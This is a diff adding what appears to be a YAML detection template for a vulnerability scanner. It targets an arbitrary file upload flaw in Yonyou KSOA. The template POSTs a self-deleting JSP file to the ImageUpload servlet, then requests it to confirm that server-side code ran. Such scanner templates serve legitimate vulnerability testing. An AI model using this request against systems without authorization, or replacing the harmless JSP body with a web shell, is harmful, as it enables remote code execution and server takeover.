@@ -1,0 +1,33 @@
+name: yaml-poc-yonyou-yonyou_ksoa-file_upload-CT-463219
+binding: 2fbe406b-f5ac-4b65-94a4-dbf52a4a8a99
+detail:
+    author: system_user
+    links:
+        - https://cn-sec.com/archives/1329088.html
+    vulnerability:
+        id: d88717ef-f205-4a90-8e8e-fd229156ad32
+        level: critical
+    warning: File Upload (Auto Clear)
+transport: http
+set:
+    rfilename: randomLowercase(4)
+    s1: randomInt(40000, 44800)
+    s2: randomInt(40000, 44800)
+    rboundary: randomLowercase(8)
+rules:
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename={{rfilename}}.jsp&_ZQA_ID=
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: <%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        expression: response.status == 200 && response.body.bcontains(b"<root>")
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /pictures/{{rfilename}}.jsp
+        expression: response.status == 200 && response.body.bcontains(bytes(string(s1 * s2)))
+expression: r1() && r2()
